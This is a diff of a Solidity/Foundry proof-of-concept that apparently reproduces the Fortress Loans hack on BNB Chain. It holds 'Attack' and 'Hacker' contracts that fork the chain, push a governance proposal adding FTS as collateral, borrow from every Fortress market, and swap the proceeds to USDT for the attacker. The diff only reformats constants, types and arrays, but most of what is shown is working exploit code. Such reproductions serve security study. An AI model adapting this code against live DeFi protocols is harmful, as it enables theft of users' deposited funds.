@@ -26,32 +26,43 @@ import {IERC20, IPriceFeed, IPancakeRouter, IUnitroller, IVyper} from "../interf
     Learnblockchain.cn Analysis :  https://learnblockchain.cn/article/4062
 */
 
-address constant attacker = 0xA6AF2872176320015f8ddB2ba013B38Cb35d22Ad;
-address constant MAHA = 0xCE86F7fcD3B40791F63B86C3ea3B8B355Ce2685b;
-address constant FTS = 0x4437743ac02957068995c48E08465E0EE1769fBE;
-address constant fFTS = 0x854C266b06445794FA543b1d8f6137c35924C9EB;
-address constant GovernorAlpha = 0xE79ecdB7fEDD413E697F083982BAC29e93d86b2E;
-address constant ChainContract = 0xc11B687cd6061A6516E23769E4657b6EfA25d78E;
-address constant FortressPriceOracle = 0x00fcF33BFa9e3fF791b2b819Ab2446861a318285;
-address constant PriceFeed = 0xAa24b64C9B44D874368b09325c6D60165c4B39f2;
-address constant Unitroller = 0x67340Bd16ee5649A37015138B3393Eb5ad17c195;
-address constant BorrowerOperations = 0xd55555376f9A43229Dc92abc856AA93Fee617a9A;
+// ERC20 Tokens
 address constant ARTH = 0xB69A424Df8C737a122D0e60695382B3Eec07fF4B;
 address constant ARTHUSD = 0x88fd584dF3f97c64843CD474bDC6F78e398394f4;
+address constant FTS = 0x4437743ac02957068995c48E08465E0EE1769fBE;
+address constant fFTS = 0x854C266b06445794FA543b1d8f6137c35924C9EB;
+address constant MAHA = 0xCE86F7fcD3B40791F63B86C3ea3B8B355Ce2685b;
+address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
+address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
+
+// Compound Contracts
+address constant BorrowerOperations = 0xd55555376f9A43229Dc92abc856AA93Fee617a9A;
+address constant Unitroller = 0x67340Bd16ee5649A37015138B3393Eb5ad17c195;
+
+// Price Oracles
+address constant FortressPriceOracle = 0x00fcF33BFa9e3fF791b2b819Ab2446861a318285;
+address constant PriceFeed = 0xAa24b64C9B44D874368b09325c6D60165c4B39f2;
+
+// Governance
+address constant GovernorAlpha = 0xE79ecdB7fEDD413E697F083982BAC29e93d86b2E;
+
+// DEX Routers
+address constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
+
+// Other Contracts
+address constant attacker = 0xA6AF2872176320015f8ddB2ba013B38Cb35d22Ad;
+address constant ChainContract = 0xc11B687cd6061A6516E23769E4657b6EfA25d78E;
 address constant Vyper1 = 0x98245Bfbef4e3059535232D68821a58abB265C45;
 address constant Vyper2 = 0x1d4B4796853aEDA5Ab457644a18B703b6bA8b4aB;
-address constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
-address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
-address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
 
 interface IGovernorAlpha {
     function propose(
         address[] memory targets,
-        uint[] memory values,
+        uint256[] memory values,
         string[] memory signatures,
         bytes[] memory calldatas,
         string memory description
-    ) external returns (uint);
+    ) external returns (uint256);
 
     function castVote(uint256 proposalId, bool support) external;
 
@@ -61,7 +72,7 @@ interface IGovernorAlpha {
 
     function state(uint256 proposalId) external view;
 
-    function proposalThreshold() external view returns (uint);
+    function proposalThreshold() external view returns (uint256);
 }
 
 interface IChain {
@@ -89,7 +100,7 @@ interface IFTS {
 
     function delegate(address delegatee) external;
 
-    function getPriorVotes(address account, uint blockNumber) external view returns (uint96);
+    function getPriorVotes(address account, uint256 blockNumber) external view returns (uint96);
 }
 
 interface IfFTS {
@@ -179,35 +190,22 @@ contract Attack is Test {
 
         // Get all Fortress Loans markets
         address[] memory markets = IUnitroller(Unitroller).getAllMarkets();
-        address fbnb = markets[0]; // 0xe24146585e882b6b59ca9bfaaaffed201e4e5491
-        address fusdc = markets[1]; // 0x3ef88d7fde18fe966474fe3878b802f678b029bc
-        address fusdt = markets[2]; // 0x554530ecde5a4ba780682f479bc9f64f4bbff3a1
-        address fbusd = markets[3]; // 0x8bb0d002bac7f1845cb2f14fe3d6aae1d1601e29
-        address fbtc = markets[4]; // 0x47baa29244c342f1e6cde11c968632e7403ae258
-        address feth = markets[5]; // 0x5f3ef8b418a8cd7e3950123d980810a0a1865981
-        address fltc = markets[6]; // 0xe75b16cc66f8820fb97f52f0c25f41982ba4daf3
-        address fxrp = markets[7]; // 0xa7fb72808de4ffcacf9a815bd1ccbe70f03b54ca
-        address fada = markets[8]; // 0x4c0933453359733b4867dff1145a9a0749931a00
-        address fdai = markets[9]; // 0x5f30fdddcf14a0997a52fdb7d7f23b93f0f21998
-        address fdot = markets[10]; // 0x8fc4f7a57bb19e701108b17d785a28118604a3d1
-        address fbeth = markets[11]; // 0x8ed1f4c1326e5d3c1b6e99ac9e5ec6651e11e3da
-        address fshib = markets[14]; // 0x073c0ac03e7c839c718a65e0c4d0724cc0bd2b5f
 
         // Borrow ERC-20 Tokens
         IFBep20Delegator[13] memory Delegators = [
-            IFBep20Delegator(fbnb),
-            IFBep20Delegator(fusdc),
-            IFBep20Delegator(fusdt),
-            IFBep20Delegator(fbusd),
-            IFBep20Delegator(fbtc),
-            IFBep20Delegator(feth),
-            IFBep20Delegator(fltc),
-            IFBep20Delegator(fxrp),
-            IFBep20Delegator(fada),
-            IFBep20Delegator(fdai),
-            IFBep20Delegator(fdot),
-            IFBep20Delegator(fbeth),
-            IFBep20Delegator(fshib)
+            IFBep20Delegator(markets[0]), // fbnb
+            IFBep20Delegator(markets[1]), // fusdc
+            IFBep20Delegator(markets[2]), // fusdt
+            IFBep20Delegator(markets[3]), // fbusd
+            IFBep20Delegator(markets[4]), // fbtc
+            IFBep20Delegator(markets[5]), // feth
+            IFBep20Delegator(markets[6]), // fltc
+            IFBep20Delegator(markets[7]), // fxrp
+            IFBep20Delegator(markets[8]), // fada
+            IFBep20Delegator(markets[9]), // fdai
+            IFBep20Delegator(markets[10]), // fdot
+            IFBep20Delegator(markets[11]), // fbeth
+            IFBep20Delegator(markets[14]) // fshib
         ];
 
         for (uint8 i; i < Delegators.length; i++) {
@@ -219,12 +217,7 @@ contract Attack is Test {
 
         IERC20(MAHA).approve(BorrowerOperations, type(uint256).max);
         IBorrowerOperations(BorrowerOperations).openTrove(
-            1e18,
-            1e27,
-            IERC20(MAHA).balanceOf(address(this)),
-            address(0),
-            address(0),
-            address(0)
+            1e18, 1e27, IERC20(MAHA).balanceOf(address(this)), address(0), address(0), address(0)
         );
 
         IERC20(ARTH).approve(ARTHUSD, type(uint256).max);
@@ -240,34 +233,21 @@ contract Attack is Test {
     function withdrawAll() public {
         // Get all Fortress Loans markets
         address[] memory markets = IUnitroller(Unitroller).getAllMarkets();
-        address fbnb = markets[0]; // 0xe24146585e882b6b59ca9bfaaaffed201e4e5491
-        address fusdc = markets[1]; // 0x3ef88d7fde18fe966474fe3878b802f678b029bc
-        address fusdt = markets[2]; // 0x554530ecde5a4ba780682f479bc9f64f4bbff3a1
-        address fbusd = markets[3]; // 0x8bb0d002bac7f1845cb2f14fe3d6aae1d1601e29
-        address fbtc = markets[4]; // 0x47baa29244c342f1e6cde11c968632e7403ae258
-        address feth = markets[5]; // 0x5f3ef8b418a8cd7e3950123d980810a0a1865981
-        address fltc = markets[6]; // 0xe75b16cc66f8820fb97f52f0c25f41982ba4daf3
-        address fxrp = markets[7]; // 0xa7fb72808de4ffcacf9a815bd1ccbe70f03b54ca
-        address fada = markets[8]; // 0x4c0933453359733b4867dff1145a9a0749931a00
-        address fdai = markets[9]; // 0x5f30fdddcf14a0997a52fdb7d7f23b93f0f21998
-        address fdot = markets[10]; // 0x8fc4f7a57bb19e701108b17d785a28118604a3d1
-        address fbeth = markets[11]; // 0x8ed1f4c1326e5d3c1b6e99ac9e5ec6651e11e3da
-        address fshib = markets[14]; // 0x073c0ac03e7c839c718a65e0c4d0724cc0bd2b5f
 
         IFBep20Delegator[13] memory Delegators = [
-            IFBep20Delegator(fbnb),
-            IFBep20Delegator(fusdc),
-            IFBep20Delegator(fusdt),
-            IFBep20Delegator(fbusd),
-            IFBep20Delegator(fbtc),
-            IFBep20Delegator(feth),
-            IFBep20Delegator(fltc),
-            IFBep20Delegator(fxrp),
-            IFBep20Delegator(fada),
-            IFBep20Delegator(fdai),
-            IFBep20Delegator(fdot),
-            IFBep20Delegator(fbeth),
-            IFBep20Delegator(fshib)
+            IFBep20Delegator(markets[0]), // fbnb
+            IFBep20Delegator(markets[1]), // fusdc
+            IFBep20Delegator(markets[2]), // fusdt
+            IFBep20Delegator(markets[3]), // fbusd
+            IFBep20Delegator(markets[4]), // fbtc
+            IFBep20Delegator(markets[5]), // feth
+            IFBep20Delegator(markets[6]), // fltc
+            IFBep20Delegator(markets[7]), // fxrp
+            IFBep20Delegator(markets[8]), // fada
+            IFBep20Delegator(markets[9]), // fdai
+            IFBep20Delegator(markets[10]), // fdot
+            IFBep20Delegator(markets[11]), // fbeth
+            IFBep20Delegator(markets[14]) // fshib
         ];
 
         // Swap each underlyAsset to attacker, Path: Asset->WBNB->USDT
@@ -284,11 +264,7 @@ contract Attack is Test {
             mulitHop[2] = USDT;
             IERC20(underlyAsset).approve(PancakeRouter, type(uint256).max);
             IPancakeRouter(payable(PancakeRouter)).swapExactTokensForTokens(
-                amount,
-                0,
-                mulitHop,
-                msg.sender,
-                block.timestamp
+                amount, 0, mulitHop, msg.sender, block.timestamp
             );
         }
 
@@ -297,10 +273,7 @@ contract Attack is Test {
         singleHop[0] = WBNB;
         singleHop[1] = USDT;
         IPancakeRouter(payable(PancakeRouter)).swapExactETHForTokens{value: address(this).balance}(
-            0,
-            singleHop,
-            msg.sender,
-            block.timestamp
+            0, singleHop, msg.sender, block.timestamp
         );
         emit log_string("\t[Pass] Swap BNB->USDT, amountOut send to attacker");
 
@@ -359,7 +332,7 @@ contract Hacker is Test {
         vm.createSelectFork("bsc", 17_490_882);
 
         address[] memory _target = new address[](1);
-        uint[] memory _value = new uint[](1);
+        uint256[] memory _value = new uint256[](1);
         string[] memory _signature = new string[](1);
         bytes[] memory _calldata = new bytes[](1);
 
@@ -370,11 +343,7 @@ contract Hacker is Test {
 
         vm.prank(address(PCreater));
         IGovernorAlpha(GovernorAlpha).propose(
-            _target,
-            _value,
-            _signature,
-            _calldata,
-            "Add the FTS token as collateral."
+            _target, _value, _signature, _calldata, "Add the FTS token as collateral."
         );
         emit log_string("[Pass] Attacker created Proposal Id 11");
 
